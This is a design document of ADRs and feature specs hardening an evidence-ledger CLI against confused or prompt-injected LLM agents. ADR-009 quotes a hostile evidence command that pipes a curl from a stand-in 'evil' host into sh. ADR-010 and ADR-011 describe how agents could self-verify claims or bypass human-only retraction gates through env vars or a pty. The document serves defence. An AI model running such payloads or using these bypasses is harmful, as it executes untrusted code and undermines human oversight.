# Hardening proposals for the solo-developer regime

**Status:** Accepted (2026-07-12, operator) and implemented as CLI
v0.6.0. The decision records now live where they belong:
`template/docs/adr/007-quantifier-scope-gate.md` through
`012-divergence-subtype.md` — those are authoritative from here on;
this document remains the review artifact (full traceability, threat
model, and the FS-1/2/3/4 feature specs, which are not ADR-shaped).

**Implementation status (2026-07-12, v0.6.0).** Everything below except
FS-3's cache body is implemented template-side and canary-gated:

| Item | Shipped as | Gated by |
|---|---|---|
| ADR-007 | intake gate + `--scope-ok`/`scope_basis` | FAULTS Q1–Q4; unit tests |
| ADR-008 | `validate` order rules (commit gate inherits) | FAULTS B1–B2; unit tests |
| ADR-009 | screen at intake **and** recheck; `.truth/evidence-allow` (copier `_skip_if_exists`); `--evidence-unsafe-ok` ⇒ `screened:false` ⇒ recheck refuses | FAULTS E1–E4; unit tests |
| ADR-010 | same-session `agree` refused; self-diverge allowed | FAULTS V1–V3 |
| ADR-011 | TTY typed-id confirm or `TRUTH_HUMAN_ACK=<id>`; refusals no longer name the ritual | FAULTS H1–H3 + updated M/R6 |
| ADR-012 | `diverge --mechanical` ⇒ payload `subtype`; queue/stats display | FAULT M1; conformance fixtures |
| FS-1 | `truth stats [--json] [--since]`; TTL median suggestion at intake (≥5 obs) | unit tests incl. fold cross-check |
| FS-2 | mutant generator in test-truth-core (200+ cases, agreement-asserted); mirror/schema gaps it exposed pre-fixed (actor/session minLength, ttl validity, anchor/basis minLength) | the generator itself + meta-canary count floor |
| FS-3 | `doctor` fold-latency warning only (cache deliberately unbuilt) | doctor check |
| FS-4 | `scripts/truth-session-digest.py` + SessionStart wiring, meta-repo only (ADR-003 rule 2) | smoke-tested against the live ledger |

Suite state at implementation: 91 core unit tests (drift detector armed,
jsonschema 4.25.1), 12 v0.4 regression tests, 75/75 canary faults caught
(58 before this work). The meta ledger (12 records) validates clean under
ADR-008's order rules; `doctor` is 0/0 with the allowlist installed.
Existing-canary protocol updates this required, disclosed: `agree`
verdicts in the canary now file from `TRUTH_SESSION=s-canary-verifier`
(ADR-010 — which is the honest protocol), and tombstone checks use
`TRUTH_HUMAN_ACK` (ADR-011); FAULT M's old "TRUTH_HUMAN=1 alone accepted"
arm inverted into H1, which is the point of ADR-011.

**Scope discipline.** Every proposal below is addressed to the regime the
paper actually validates: **one developer, LLM agent sessions doing the
implementation work, one repository, one machine.** The threat model that
follows from that regime, stated once so each ADR doesn't restate it: the
realistic adversary is not a malicious human — it is (a) a
*compliant-but-confused agent* that completes rituals it was told about,
including bypass rituals an error message names; (b) a *prompt-injected
agent* whose instructions arrived through content it read (a web page, a
dependency README, an issue body); and (c) *the author's own drift* —
scope overreach, the pilot's one empirically observed genuine failure
shape. Defenses are sized to that adversary. Anything requiring
cryptographic identity, multi-machine coordination, or protection against
an attacker who controls the git repository itself is out of regime and
listed under Non-goals at the end.

## Traceability: weak point → remedy

| # | Weak point | Source | Remedy | Bucket after remedy |
|---|---|---|---|---|
| 1 | Scope overreach has no mechanical defense — only §9 convention | Paper §2, §10; both genuine divergences | **ADR-007** quantifier–scope intake gate | Detected at intake |
| 2 | Backdated duplicate-id substitution (F6 × timestamp forgery) | Paper §1 "Fold semantics, precisely", §8 item 6 | **ADR-008** file-order/timestamp coherence in `validate` | Detected at commit (was: accepted) |
| 3 | Evidence commands are deferred arbitrary code execution (`shell=True` at intake and verifier recheck) | Review finding; `truth:713-715` | **ADR-009** evidence-command safety screen | Prevented at intake; refused at recheck |
| 4 | Nothing stops the authoring session filing its own `agree` — verifier independence is procedural | Review finding; G11 covers dispatch, not verdict intake | **ADR-010** session-separation gate on `agree` | Convention-with-syntax (F4 class) |
| 5 | `TRUTH_HUMAN=1` is self-attested and the refusal message teaches the bypass | Paper F4, §8 item 5; `truth:850-854` | **ADR-011** TTY confirmation for tombstones | Structural for headless agents |
| 6 | "diverged" conflates reality-changed with recipe-changed | Paper §8 item 7 | **ADR-012** mechanical-divergence subtype | Named (vocabulary) |
| 7 | Efficacy unmeasured; TTLs are author guesses | Paper §8 item 2, §6.2 | **FS-1** `truth stats` + half-life-informed TTL suggestion | Instrumented |
| 8 | Validate-mirror drift recurred twice (F1, F8) | Paper §10 ("second recurrence is the trigger") | **FS-2** constraint-enumerated conformance corpus | Prevented as a class |
| 9 | Unbounded ledger growth vs. O(n) fold per command | Review finding | **FS-3** fold snapshot cache, behind a measured trigger | Deferred behind gate |
| 10 | Discovery is behavioral for non-editing sessions (ADR-005 covers edit intent only) | Paper §8 item 5; ADR-005 non-goals | **FS-4** session-start ledger digest (consumer-side) | Structural for hook-capable harnesses |

---

## ADR-007: Quantifier–scope intake gate

Status: Proposed. Date: 2026-07-11. Supersedes: — (mechanizes §9
convention 1).

### Context

Both genuine divergences in the pilot shared one shape: a correct,
*scoped* evidence command backing a *universal* claim sentence — a
repo-wide clause ("the only occurrences in the repo are…") over a
package-scoped grep whose `--include` filter did invisible work (§2). The
paper names this the dominant real failure mode and its only current
defense is an operating convention (§9). §10 already sketches the
countermeasure; this ADR specifies it to intake-gate precision.

### Decision

`truth claim` and `done --claim` gain one more intake refusal, placed
after the near-duplicate gate and before the INV-M path checks in the
documented refusal order.

**Detection rule, exactly.** Let Q (quantifier lexicon) be the
case-folded token/phrase set:

```
only, no, none, never, nowhere, anywhere, all, every, any, entire,
whole, zero, repo-wide, "the repo", "the codebase", "the project"
```

Let S (scoping signals) be, over the evidence command string:

- any of the option tokens `--include`, `--exclude`, `--include-dir`,
  `--exclude-dir`, `-g`, `--glob`, `--path`, `--type`, `-t`;
- any positional argument that names a tracked subdirectory or a
  glob narrower than the repo root (detected as: an argument containing
  `/` or a glob metacharacter that is not `.` or `:/`);
- a `cd ` prefix.

The gate fires iff claim text ∩ Q ≠ ∅ **and** evidence command ∩ S ≠ ∅.
Refusal message:

```
truth: claim text quantifies universally ('<matched Q token>') but the
evidence command is scoped ('<matched S token>') — the exact shape of
both pilot divergences (paper §2). Either narrow the claim's sentence to
the command's actual domain, or re-file with
--scope-ok "<one sentence: why this scope covers that quantifier>".
```

**The override carries a basis, not a boolean.** `--scope-ok` requires a
non-empty sentence, stored in the payload as `scope_basis`. This is the
G8-duplicate-gate pattern (refuse, override consciously) upgraded with
the basis discipline verdicts already have: the author's scope judgment
becomes auditable ledger content the verifier can later contradict. The
verifier prompt's step 2 already instructs checking this gap; the
dispatch record now hands the verifier the author's own stated reason to
attack.

**False-positive posture.** A claim like "no calls to `frobnicate` in
`services/`" with a `services/`-scoped grep is a *correctly* scoped
universal — Q fires, S fires, the gate refuses, and the override costs
one honest sentence ("quantifier is scoped to services/, so is the
command"). This is accepted friction: the gate cannot parse semantics,
and one flag with a sentence is inside the friction budget (§9). If
field use shows override rates above ~half of gate firings, the lexicon
is too broad — see Adoption gate.

### Explicit non-goals

No NLP beyond token/phrase matching (an LLM judging claim scope would
put a judgment in a mechanical trigger path — rejected for the same
reason ADR-005 rejected agent calls in hooks). No attempt to verify that
the scope *actually* covers the quantifier — that remains the
verifier's job; this gate only forces the mismatch to be stated rather
than invisible.

### Consequences

Easier: the single empirically dominant failure shape now cannot enter
the ledger silently; every entry is either narrowed or carries an
attackable `scope_basis`. Harder: a new lexicon to maintain (kept as a
constant beside `DUPLICATE_THRESHOLD`, changed only with a canary
update); one more refusal for authors to learn.

Canary faults: **Q1** universal text + `--include` command → refused;
**Q2** same with `--scope-ok "sentence"` → accepted, `scope_basis`
present in the record; **Q3** scoped text, no Q token → passes
silently; **Q4** universal text + genuinely repo-wide command (no S
token) → passes silently.

Falsifier: a third genuine divergence of the quantifier/domain-mismatch
shape filed *through* this gate — either un-fired (lexicon gap) or fired
and overridden with a `scope_basis` that did not in fact cover the
quantifier (gate working as designed; the verifier seam caught it, which
is the system working).

### Adoption gate

Ship template-side with Q1–Q4. Review after 30 days of pilot use: if
override rate exceeds 50% of firings, narrow Q before abandoning;
if a Q4-shaped miss produces a genuine divergence, widen S.

---

## ADR-008: File-order/timestamp coherence — closing the backdating gap by detection

Status: Proposed. Date: 2026-07-11. Supersedes: — (converts §8 item 6's
composition gap from accepted to detected; amends INV-G).

### Context

The one open, undefended gap the paper states plainly (§1 "Fold
semantics, precisely"): a backdated duplicate-id claim record sorts
before the genuine one in canonical `(ts, id)` order, becomes "first,"
and silently substitutes claim text and evidence under an id that may
carry a live verdict. The prescribed fix is signed records, deferred
behind a growth gate ("build it when the first forged timestamp is found
in the wild"). But there is a detection-grade defense available now, at
zero cryptographic cost, from a property the prefix gate already
guarantees: **within one repository's history, file order is append
order.** A backdated duplicate id is therefore *visible* — it appears
later in the file than the record it sorts before.

### Decision

`truth validate` gains two rules; because `check-truth.sh` runs
`validate` on every staged ledger, rule (a) blocks at commit time with
no new gate.

**(a) FAIL — duplicate-id backdating.** For any record at line *n* whose
envelope id equals an earlier line *m*'s id: if the later record's `ts`
is strictly less than the earlier one's, fail:

```
line n: duplicate id <id> with ts earlier than line m's — canonical-order
substitution (INV-G composition gap, paper §1). A later append may not
sort before the record it duplicates.
```

Strictly-less only: git's union merge can duplicate an *identical* line
(same ts, same everything), and an identical duplicate is harmless under
first-wins — the stable sort preserves file order on equal keys, so the
genuine-first record still wins. Canary fault **B2** pins this
legitimate case as passing.

**(b) WARN — clock regression beyond tolerance.** A record whose `ts`
precedes the maximum `ts` of all *preceding lines* by more than
`TRUTH_SKEW_TOLERANCE` (default 300 s) earns a warning, not a failure —
because a branch ledger union-merged into main legitimately places
older records after newer ones, and failing there would punish the
exact merge path the confluent fold was built for. The warning exists
so a human reviewing `validate`/`doctor` output sees timestamp anomalies
that rule (a)'s narrow duplicate-id condition doesn't cover.

### Explicit non-goals

Not tamper-proofing. An actor who rewrites the file *and* the git
history that shows the rewrite defeats this — that actor owns the
repository and is outside every trust boundary this regime has. Not
monotonicity enforcement (breaks legitimate merges, above). Signed
records remain the multi-writer answer and remain deferred (§10);
this ADR removes the *silent* path in the meantime.

### Consequences

Easier: INV-G's open caveat and INV-N's matching caveat both tighten
from "accepted, undefended" to "detected at commit"; Appendix A rows
update accordingly. The attack now requires either committing a
validate-failing ledger past the gate (visible) or rewriting history
(visible in reflog/remote). Harder: `validate` acquires its first
*order-sensitive* rules — it must be documented that `validate --stdin`
on a re-sorted stream is not equivalent to validating the file (the
canonical fold is order-independent; this check deliberately is not,
because file order is the evidence).

Canary faults: **B1** backdated duplicate-id append → `validate` fails,
commit gate blocks; **B2** identical duplicated line (union-merge shape)
→ passes; **B3** sub-tolerance inversion (interleaved sessions) →
silent; **B4** super-tolerance inversion → warns, does not block.

Falsifier: a demonstrated content-substitution via backdated duplicate
id that reaches a *committed* ledger with `validate` green.

### Adoption gate

Ship with B1–B4. This ADR intentionally satisfies the original growth
gate's spirit early: it is the cheap half of the signed-records defense,
and if a B1-class violation ever fires in a real ledger, that *is* the
"first forged timestamp found in the wild" — the signed-records trigger
condition, now mechanically observable instead of hoped-to-be-noticed.

---

## ADR-009: Evidence-command safety screen

Status: Proposed. Date: 2026-07-11. Supersedes: —.

### Context

`run_evidence` executes an author-supplied string with `shell=True` —
at intake (twice, for the determinism check) and again, later, **in a
different session's context**, whenever a verifier runs
`verdict --recheck`. That second execution is the problem: it is
deferred code execution across the very trust seam the dispatch
protocol is careful about. G11 ensures the verifier receives no
author *reasoning*; nothing ensures the verifier doesn't execute author
*code*. In this regime the realistic path is (b) from the threat model:
a prompt-injected authoring session files a VERIFIED claim whose
evidence command is a payload (`grep -r foo src && curl evil.sh | sh`),
and the payload detonates when an obedient verifier — instructed by the
fixed prompt to run `--recheck` first, deterministically — obeys.

### Decision

A static screen applied in **both** places the shell executes evidence:
intake (`build_claim_payload`) and recheck (`cmd_verdict --recheck`).
Screening at recheck is not redundant — the ledger may carry records
that predate the screen or were appended raw; recheck screens against
the current policy, not the filing-time one.

**Mechanism.** Tokenize the command QUOTE-AWARE (shlex punctuation
mode, stdlib) — the very first real ledger commands proved a naive
operator split wrong twice: a `grep -oE '…|…'` regex carries pipes
inside quotes (arguments, not separators), and `>/dev/null 2>&1` is
read-only by definition. The command passes iff:

1. every segment's program token appears in the allowlist file
   `.truth/evidence-allow` (one name per line, comments with `#`), and is
   a bare name, not a path (`./grep` is an attacker-supplied binary
   wearing an allowlisted name);
2. no command substitution (`$(`, backtick), no subshells; output
   redirection only to `/dev/null` or an fd dup (`2>&1`); input
   redirection (`<`) is read-only and allowed — the §9 pin-the-output
   convention (`… | wc -l`, `… >/dev/null && echo CLEAN`) must keep
   working.

The shipped default allowlist is read-only by construction — see
`template/.truth/evidence-allow` for the authoritative list (restating
it here would be the exact prose-rot this project exists to prevent;
notably `sed`/`awk` are excluded because `sed -i` and awk redirection
write files without a `>` the screen could see).

`echo` stays (the §9 `… && echo CLEAN` sentinel convention depends on
it). Test runners (`pytest`, `npm test`, `cargo test`) are **not**
shipped — a test runner executes repository code and is exactly the
arbitrary-execution channel being screened; a consumer adds their
runner to the allowlist as a conscious, committed policy decision, which
is the ADR-003 rule-2 placement (consumer policy, template-shipped
default).

**Override semantics — the load-bearing part.** Intake accepts a
screen-failing command only with `--evidence-unsafe-ok`, which stores
`"screened": false` in the evidence capsule. But **recheck never
executes an unscreened command**: `verdict --recheck` on such a claim
declines, files nothing, and prints

```
<id>: evidence command failed the safety screen (screened=false) --
recheck will not execute it. If you trust it, run it yourself and file
a manual verdict with a basis naming what you ran.
```

So the override preserves filing freedom (solo operator, own repo, own
risk) while closing the *deferred, cross-session* execution channel
entirely — the only channel that distinguishes this from "the agent can
run bash anyway."

**Failure policy.** Missing allowlist file → intake of VERIFIED claims
fails closed with guidance to create it (the F1 lesson: protective
machinery may not silently skip).

### Explicit non-goals

Not a sandbox — an allowlisted `git log` still reads anything the
repository can read; output confidentiality is out of scope (note: the
ledger stores only the output *hash*, never output, so the ledger
itself is not an exfiltration channel). Not full shell parsing —
constructs the tokenizer can't confidently decompose fail closed.

### Consequences

Easier: the one genuine security gap in the regime closes; verifier
sessions become safe to run against a ledger whose authors may have
been prompt-injected. Harder: evidence commands lose expressive
power by default; the §9 pin-the-output convention already pushes
toward simple deterministic pipelines, so the practical loss is small.
The allowlist is one more config surface that can rot — `doctor` checks
it exists and is non-empty.

Canary faults: **E1** `curl` segment → intake refused; **E2** pipeline
of allowlisted segments (`grep … | wc -l`) → passes; **E3** legacy/raw
record with unscreened command → recheck declines to execute, exits
with guidance, ledger untouched; **E4** allowlist file absent → VERIFIED
intake fails closed with creation guidance.

Falsifier: any path by which `verdict --recheck` executes a command that
was never screened.

---

## ADR-010: Session separation on agree verdicts

Status: Proposed. Date: 2026-07-11. Supersedes: — (extends F4's
norm→syntax conversion to the verdict seam).

### Context

G11 scripts what a verifier *receives*. Nothing scripts who may *file*.
The independence property the whole §2 result rests on — "verifiers
receiving dispatch-only context caught the author both times" — is
enforced by operator procedure, not by the CLI: the authoring session
can run `truth verdict <own-claim> agree --basis "checked it"` and mint
its own `live` status in one command. The realistic failure is threat
(a): an eager agent completing the verification ritual on its own work
because the instruction file says claims should be verified. F4
established the house pattern for exactly this shape: convert the norm
into a convention with a syntax, accepting that identity is
self-attested.

### Decision

`truth verdict <id> agree` refuses when the filing session (the
envelope `session` the verdict *would* carry) equals the claim record's
`session`:

```
truth: agree on your own session's claim is self-verification -- the
independence seam (G11) exists because authors share their own blind
spots. Dispatch it instead: scripts/truth dispatch <id> | <fresh
session>. A human overrides with TRUTH_SELF_VERDICT=1.
```

**Asymmetric by design:** `diverge` and `cannot_verify` from the
authoring session remain allowed — self-incrimination runs against
interest and matches the existing rule that corrections of dead claims
bypass the duplicate gate (UC-4). Only the self-serving verdict needs
the gate. The `--recheck` path needs no exemption logic: its
auto-filed outcomes are only the negative ones, which are exempt anyway.

### Explicit non-goals

Not identity. `session` is env-or-ppid-derived and forgeable in one
export; `TRUTH_SELF_VERDICT=1` is self-attested exactly as
`TRUTH_HUMAN=1` is. This is F4's trust class, adopted knowingly: the
defense is against drift, not adversaries — an agent must now *visibly
perform* a bypass ritual (settable env var, attributable in the record)
rather than drift into self-verification through the front door.

### Consequences

Easier: the §2 independence result becomes a property of the CLI
surface rather than of operator discipline; the ledger's `live` status
regains its intended meaning ("independently confirmed") by
construction. Harder: a legitimate same-session re-check after a
trivial fix now needs either a fresh session or the env var — accepted,
that friction is the point.

Canary faults: **V1** same-session `agree` → refused; **V2**
different-session `agree` → accepted; **V3** same-session `diverge` →
accepted.

Falsifier: a claim whose only `agree` verdict shares its session id,
present in a committed ledger, with no `TRUTH_SELF_VERDICT` audit trail
in the operator's environment story.

---

## ADR-011: Tombstones require a terminal — hardening TRUTH_HUMAN against compliant agents

Status: Proposed. Date: 2026-07-11. Supersedes: amends F4's fix.

### Context

F4's fix converted "retraction is humans-only" from an unenforced norm
into the `TRUTH_HUMAN=1` convention, documented as self-attested (§8
item 5). In an LLM-agent regime that convention has a specific
weakness the paper's phrasing undersells: **the refusal message names
the bypass.** "A human confirms by running with TRUTH_HUMAN=1" is, to a
compliant-but-confused agent, an instruction — one tool call from
compliance theater. The realistic solo-regime threat is not a forger;
it is an agent that sets the variable because the error told it how,
then reports the retraction as completed work.

### Decision

Tombstone operations (`verdict … retracted`, `done --cancel`) require,
in addition to `TRUTH_HUMAN=1`:

- **stdin is a TTY**, and
- an interactive confirmation: the operator types the target id back.

Agent harness shells have no TTY; the structural fact does the
enforcing. For genuinely headless human use (CI cleanup, scripted
maintenance), the escape is `TRUTH_HUMAN_ACK=<exact-id>` — it must name
the *specific* record being killed, so a lingering exported variable
cannot authorize arbitrary future tombstones, and each use is one
deliberate, id-specific act.

The refusal message changes to stop teaching the ritual:

```
truth: retraction is a human tombstone decision (G12). If you are an
agent: file `diverge` with a basis saying the claim should die, and
stop -- the human queue decides. If you are a human: re-run this in
your own terminal.
```

### Explicit non-goals

Still not identity — a human at a TTY is asserted by the TTY, and a
determined process can allocate a pty. The claim is narrower and
honest: the *one-export bypass an error message can teach* is closed;
the cost of agent tombstoning rises from one env var to deliberate
pty allocation plus an id-specific acknowledgment, which no plausible
drift produces by accident.

### Consequences

Easier: the strongest promise in the system (terminality) stops resting
on agents declining an invitation the CLI itself extends. Harder: human
tombstones can no longer be filed *through* an agent session's Bash
tool — the human drops to their own terminal, which is exactly the
ceremony a kill decision deserves.

Canary faults: **H1** `TRUTH_HUMAN=1`, no TTY, no ACK → refused; **H2**
`TRUTH_HUMAN_ACK` matching the id → accepted; **H3** ACK naming a
different id → refused. (TTY-positive paths are untestable in the
sandboxed canary and are covered by `doctor`'s documentation instead —
stated, not hidden.)

---

## ADR-012: Divergence subtype — paying down the vocabulary debt

Status: Proposed. Date: 2026-07-11. Supersedes: — (resolves §8 item 7).

### Context

"Diverged" conflates two facts the pilot already had to separate by
hand in §2's table: *reality changed* (the claim is wrong) and *the
measuring recipe changed* (output format drift; the fact still true).
The distinction is unnamed in the status vocabulary, and FS-1's
efficacy metrics are impossible without it — a genuine-divergence rate
diluted by mechanical divergences measures nothing.

### Decision

`truth verdict <id> diverge --mechanical` stores
`"subtype": "mechanical"` in the verdict payload. The fold is
**unchanged** — status is still `diverged`, the claim still queues,
because a mechanically-diverged claim still needs a human action
(re-file with a stable evidence recipe; §9's pin-the-output convention
exists precisely to make this rare). `queue` and `list` display the
subtype; `stats` (FS-1) reports the two rates separately. The verifier
prompt gains one sentence: "if the hash mismatch traces to output
format rather than the claimed fact, add `--mechanical` to your
diverge."

### Consequences

Easier: §2-style tables become mechanical queries; TTL calibration
(FS-1) can exclude mechanical noise. Harder: nothing measurable — one
optional flag, no fold change, no schema-required field (subtype is
optional in the schema and the mirror, with a conformance fixture
each way per FS-2 discipline).

Canary fault: **M1** diverge with `--mechanical` round-trips the
subtype through fold → queue output.

---

## FS-1: `truth stats` — efficacy instrumentation and data-driven TTLs

**What.** A pure fold consumer, `truth stats [--json] [--since <ts>]`,
computing from the ledger alone:

- claims by status × tier × evidence class;
- verdict outcomes: agree / diverge(genuine) / diverge(mechanical) /
  cannot_verify counts and rates (requires ADR-012);
- **claim half-life**: for every claim that has been `live` and later
  `stale`, the elapsed live-time; reported as median and quartiles per
  tier — turning §6.2's decay metaphor into the calibrated number it
  says the data can already support;
- queue age distribution (the `doctor` aging check, quantified);
- per-session filing and verdict counts (the §8 item 1 audit's raw
  material).

**TTL suggestion at intake.** When a VERIFIED claim is filed with
`--ttl-days` and the ledger holds ≥ 5 completed half-life observations
for that tier, intake *prints* the observed median beside the author's
choice ("ledger median half-life for P1: 9d; you chose 30d"). Never
auto-set, never refuse — TTLs stay author decisions, now data-adjacent.
Below the observation threshold, silence (no suggestion from noise).

**The monthly audit, operationalized.** §8 item 2 prescribes a monthly
hand-audit (first due ~2026-08-08). `stats --since <day0>` is that
audit's mechanical half; the hand half (re-judging a sample of `live`
claims cold) stays manual by design — it is the check *on* the
machinery and must not be run *by* the machinery.

**What this deliberately does not claim.** An N-of-1 alternating-period
comparison (ledger-armed weeks vs. convention-only weeks, outcome =
defects traced to a false premise) is sketched here only to be scoped
honestly: learning effects contaminate it and it cannot establish the
§10 efficacy result. `stats` makes the real trial *possible to run
elsewhere*; it does not substitute for it.

**Acceptance.** Half-life computation property-tested against
hand-computed fixtures; suggestion threshold behavior canary-gated
(**T1** below-threshold silence, **T2** at-threshold suggestion).

---

## FS-2: Constraint-enumerated conformance corpus — closing the F1/F8 class

**What.** F1 and F8 are one defect twice: two hand-maintained copies of
the record contract (JSON Schema, stdlib mirror) drifting, and a
hand-curated fixture corpus that samples the contract instead of
covering it. §10 names the trigger ("second recurrence") as already
met. The class-closing fix that respects stdlib-only: **derive the
corpus from the schema mechanically** rather than deriving the mirror
from the schema (full JSON-Schema→code generation is out of budget;
constraint enumeration is ~150 lines).

**Mechanism.** A generator walks `claims.schema.json` restricted to the
constraint kinds the schema actually uses — `required`, `enum`,
`minLength`, `pattern`, `anyOf` — and, from one valid seed record per
record kind, emits one mutant per constraint instance: delete the
required field; set the enum to `"__XXX__"`; empty the minLength
string; break the pattern; violate each `anyOf` arm in turn. The
conformance test then asserts, for every mutant: `jsonschema` (when
present — and F1's armed-detector rule already makes its absence a
failure) and the stdlib mirror **agree** — both reject, or the suite
fails naming the disagreeing mutant.

**Property achieved.** Any constraint added to the schema automatically
grows a mutant; a mirror that lags fails the suite the same day, not at
the next hand-audit. The hand-curated corpus is retained (it encodes
history — F1's and F8's exact shapes) but stops being the only line.

**Acceptance.** Deleting any single `required` line from the schema, or
any single mirror check, must fail the suite (a meta-canary: the
generator is itself detection machinery and must not fail open — the
F1 lesson applied to F1's own fix). Fault **G1**: mirror check removed →
suite red. Fault **G2**: schema constraint added without mirror update →
suite red.

---

## FS-3: Fold snapshot cache — a scale pass behind a measured gate

**What.** Every command re-reads and re-folds the whole ledger; the log
is append-only and never compacted, so cost grows without bound.
At pilot scale this is nothing. The discipline the project already uses
(growth gates; "build it when triggered, not before") applies squarely.

**The gate first.** `doctor` gains a timing check: measure
load-and-fold wall time; **WARN above 200 ms** ("scale gate tripped —
see FS-3"). Until that warning fires in a real repository, this spec
stays unimplemented on purpose.

**The mechanism, when triggered.** A derived-state cache at
`.git/truth-fold.json` (inside `.git/`, therefore never committed,
never part of the contract): `{ledger_sha256, claims, premises,
issues}`. On load: hash the ledger bytes; on match, use the cached
derivation; on mismatch, full refold and rewrite. No incremental
folding — the fold is already O(n) cheap once the bytes are read, and
incremental replay would reintroduce the order-sensitivity the
confluent sort exists to kill. The cache is pure memoization: **the
property, canary-gated (fault C1), is that cached and uncached
derivations are byte-identical**, and any cache-read error falls back
to a full fold silently (the cache is not detection machinery; fail-open
is correct here, the one place it is).

**Non-goal.** Compaction. It will be tempting at 100k records; it
violates append-only and INV-A, and would need a superseding ADR with a
snapshot-attestation design — out of this regime's needs and out of
this spec.

---

## FS-4: Session-start ledger digest — discovery for sessions that never edit

**What.** ADR-005's whisper fires at *edit intent*, so a session that
only reads, answers questions, or plans — and asserts repository facts
while doing so — can still live and die without discovering the ledger
if it never loaded the instruction files. The remaining discovery hole
is session *birth*.

**Mechanism (consumer-side, per ADR-003 rule 2 — harness wiring is
consumer policy, exactly like the whisper hook).** A SessionStart hook
injects one bounded context block:

- `truth queue` output (attention debt first — it's the human's queue,
  but the agent should not re-derive facts the queue says are dying);
- the top 5 `live` P0/P1 claims (id + text) — the facts most expensive
  to contradict;
- one closing line: "check facts before relying on them:
  `scripts/truth list --live`; file what you verify (AGENTS.md)."

**Fatigue budget, designed in (the ADR-005 lesson, applied at birth
instead of edit):** once per session, P0/P1 only, hard cap ~15 lines.
An empty ledger or empty queue injects nothing — silence stays the
default. Failure policy: fails open, visibly (one stderr line), same
as the whisper stage — advisory machinery never blocks a session.

**Consequence.** With ADR-005 covering the edit path and this covering
the read path, discovery is structural on both session entry points for
hook-capable harnesses; the four-line AGENTS.md snippet remains the
fallback for harnesses without hooks — the residual is named, smaller,
and unchanged in kind.

**Acceptance.** Consumer-side check in `doctor` (hook wired in the
active harness config), mirroring the whisper's doctor check;
injection content asserted by one fixture test (**D1**: nonempty queue
→ digest contains the queue row; **D2**: empty ledger → zero output).

---

## Non-goals for this entire document — out of regime

Stated once, so their absence above reads as decision rather than
omission:

- **Signed records / cryptographic identity.** The multi-writer,
  mutually-distrusting-actors answer (§10). In this regime every writer
  is the operator or the operator's agents; ADR-008 converts the one
  concrete silent attack to detected-at-commit, which is proportionate.
  The growth gate stands, and ADR-008's B1 fault is now its mechanical
  trigger.
- **Multi-machine / multi-human concurrency.** `O_APPEND`
  single-filesystem atomicity and union-merge confluence are the
  regime's actual shape; two humans on two machines is a different
  paper (§8 item 4 says so; nothing here changes it).
- **Identity-checked TRUTH_HUMAN.** ADR-011 hardens the convention
  against the regime's real adversary (compliant agents); verifying
  *which human* is out of scope in a one-human regime by definition.
- **Compaction / retention.** Violates append-only; FS-3's cache is the
  regime-proportionate answer to growth.

## Suggested adoption order

By value against observed evidence, not by effort:

1. **ADR-007** — targets 100% of the pilot's genuine failures; nothing
   else on this list has field data behind it yet.
2. **ADR-009** — the only true security gap; cheap, and its cost falls
   on a convention (§9) that already points the same direction.
3. **ADR-008** — converts the paper's one admitted-undefended attack to
   detected, for ~40 lines of `validate`.
4. **ADR-010 + ADR-011** — the two remaining norm→syntax conversions;
   small, and they complete F4's pattern across every trust-bearing verb.
5. **ADR-012 + FS-1** — vocabulary before measurement, measurement
   before the efficacy debate; the monthly audit lands ~2026-08-08 and
   `stats` should exist before it.
6. **FS-2** — the trigger is already met by the paper's own rule.
7. **FS-4** — after ADR-005's trial reports signal-without-fatigue, not
   before; it spends the same budget.
8. **FS-3** — when `doctor` says so, and not a day earlier.
